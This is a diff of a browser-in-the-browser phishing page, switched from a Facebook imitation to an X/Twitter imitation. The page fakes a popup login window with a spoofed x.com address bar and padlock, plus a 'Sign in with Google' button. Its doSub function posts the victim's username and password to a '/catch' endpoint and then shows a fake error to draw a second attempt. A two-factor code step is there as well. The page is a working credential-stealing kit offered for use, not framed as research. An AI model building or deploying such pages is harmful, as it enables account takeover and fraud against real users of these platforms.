@@ -1,33 +1,38 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-<title>Facebook – log in or sign up</title>
+<title>X / Twitter</title>
 <style>*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;}
-.brand{text-align:center}.brand h1{color:#1877f2;font-size:3.5em;font-weight:800;letter-spacing:-1px}
-.brand p{color:#1c1e21;font-size:1.1em;max-width:380px;line-height:1.4}
-.card{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);width:380px}
-.card input{width:100%;padding:14px 16px;border:1px solid #ccd0d5;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
-.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
-.card .login-btn{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
-.card .login-btn:hover{background:#166fe5}
-.card .forgot{text-align:center;color:#1877f2;font-size:14px;cursor:pointer;text-decoration:none;display:block;margin-bottom:16px}
-.card hr{border:none;border-top:1px solid #dadde1;margin-bottom:16px}
-.card .new-btn{display:block;width:fit-content;margin:0 auto;padding:14px 24px;background:#42b72a;color:white;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
-#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+.card{background:#000;border:none;width:380px;text-align:center;padding:40px 24px}
+.xlogo{font-size:48px;color:white;font-weight:900;margin-bottom:28px;line-height:1}
+.card h1{color:white;font-size:28px;font-weight:700;margin-bottom:28px}
+.card input{width:100%;padding:14px 16px;background:#16181c;border:1px solid #333;border-radius:4px;font-size:16px;color:white;margin-bottom:12px;outline:none}
+.card input:focus{border-color:#1d9bf0}
+.card input::placeholder{color:#6e767d}
+.card .login-btn{width:100%;padding:14px;background:white;color:black;border:none;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:12px}
+.card .login-btn:hover{background:#e7e7e7}
+.sep{color:#6e767d;font-size:13px;margin:8px 0}
+.card .xlogin-btn{width:100%;padding:14px;background:transparent;color:white;border:1px solid #333;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer}
+.footer{margin-top:24px;color:#6e767d;font-size:14px}
+.footer a{color:#1d9bf0;text-decoration:none}
+#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:9999;align-items:center;justify-content:center}
 #ov.show{display:flex}
-.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:popIn .15s ease-out}
+.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:popIn .15s ease-out}
 @keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
-.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
+.tb{background:#2f3336;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
 .dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
 .dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
-.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
-.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
-.bd{background:white;padding:28px 32px 24px}
-.bd .logo{color:#1877f2;font-size:2em;font-weight:800;text-align:center;margin-bottom:4px}
-.bd .sub{text-align:center;font-size:13px;color:#606770;margin-bottom:20px}
-.bd input{width:100%;padding:12px 14px;border:1px solid #ccd0d5;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;box-sizing:border-box}
-.bd input:focus{border-color:#1877f2}
-.bd .bs{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
-.bd .err{display:none;color:#d93025;font-size:13px;margin-top:-6px;margin-bottom:10px}
+.ub{flex:1;background:#1c1f23;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#8b9aaa}
+.lock{color:#1d9bf0;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#8b9aaa}
+.bd{background:#000;padding:40px 40px 32px;text-align:center}
+.bd .xlogo2{font-size:36px;color:white;font-weight:900;margin-bottom:20px}
+.bd h2{color:white;font-size:22px;font-weight:700;margin-bottom:6px}
+.bd .sub2{color:#6e767d;font-size:14px;margin-bottom:24px}
+.bd input{width:100%;padding:12px 14px;background:#16181c;border:1px solid #333;border-radius:4px;font-size:15px;color:white;margin-bottom:10px;outline:none;box-sizing:border-box}
+.bd input:focus{border-color:#1d9bf0}
+.bd input::placeholder{color:#6e767d}
+.bd .bs{width:100%;padding:12px;background:white;color:black;border:none;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px}
+.bd .bs:hover{background:#e7e7e7}
+.bd .err{display:none;color:#f4212e;font-size:13px;margin-top:4px;margin-bottom:8px}
 
 #_otp_step{display:none;margin-top:8px}
 #_otp_step label{font-size:13px;color:#333;display:block;margin-bottom:4px}
@@ -37,28 +42,29 @@ body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;
 #_otp_info{font-size:13px;color:#555;text-align:center;margin-bottom:12px}
 </style><style>#_obtn{width:100%;padding:10px;cursor:pointer;font-size:15px;border-radius:4px;border:none;margin-top:4px} #_obtn{} </style>
 </head><body>
-<div class="brand"><h1>facebook</h1><p>Connect with friends and the world around you on Facebook.</p></div>
 <div class="card">
-<input type="text" placeholder="Email address or phone number" onfocus="showB()">
-<input type="password" placeholder="Password" onfocus="showB()">
-<button class="login-btn" onclick="showB()">Log In</button>
-<a class="forgot" href="#">Forgotten password?</a>
-<hr>
-<button class="new-btn">Create new account</button>
+<div class="xlogo">𝕏</div>
+<h1>Sign in to X</h1>
+<input type="text" placeholder="Phone, email, or username" onfocus="showB()">
+<button class="login-btn" onclick="showB()">Next</button>
+<div class="sep">or</div>
+<button class="xlogin-btn" onclick="showB()">Sign in with Google</button>
+<div class="footer">Don't have an account? <a href="#">Sign up</a></div>
 </div>
 <div id="ov"><div class="bw">
 <div class="tb">
 <div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
-<div class="ub"><span class="lock">&#128274;</span><span><strong>facebook.com</strong><span style="color:#888">/login</span></span></div>
+<div class="ub"><span class="lock">&#128274;</span><span><strong>x.com</strong><span style="color:#555">/i/flow/login</span></span></div>
 <button class="xbtn" onclick="hideB()">&#x2715;</button></div>
 <div class="bd">
-<div class="logo">facebook</div>
-<p class="sub">Log in to your account</p>
+<div class="xlogo2">𝕏</div>
+<h2>Sign in to X</h2>
+<p class="sub2">Enter your credentials to continue</p>
 <form id="lf" onsubmit="doSub(event)">
-<input type="text" id="fu" placeholder="Email or phone number" required>
+<input type="text" id="fu" placeholder="Phone, email, or username" required>
 <input type="password" id="fp" placeholder="Password" required>
-<p class="err" id="em">The email or mobile number you entered isn't connected to an account.</p>
-<button class="bs" type="submit">Log In</button>
+<p class="err" id="em">Wrong username or password. Try again.</p>
+<button class="bs" type="submit">Log in</button>
 </form>
 <div id="_otp_step">
   <p id="_otp_info">&#x1F512; Two-factor authentication required<br><small style="color:#888">Enter the code from your authenticator app</small></p>
@@ -74,8 +80,8 @@ document.getElementById('ov').addEventListener('click',function(e){if(e.target==
 function doSub(e){e.preventDefault();
 var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
 fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
-var b=e.target.querySelector('.bs');b.textContent='Logging in…';b.disabled=true;
-setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Log In';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
+setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Log in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
 </script>
 <script>
 (function(){
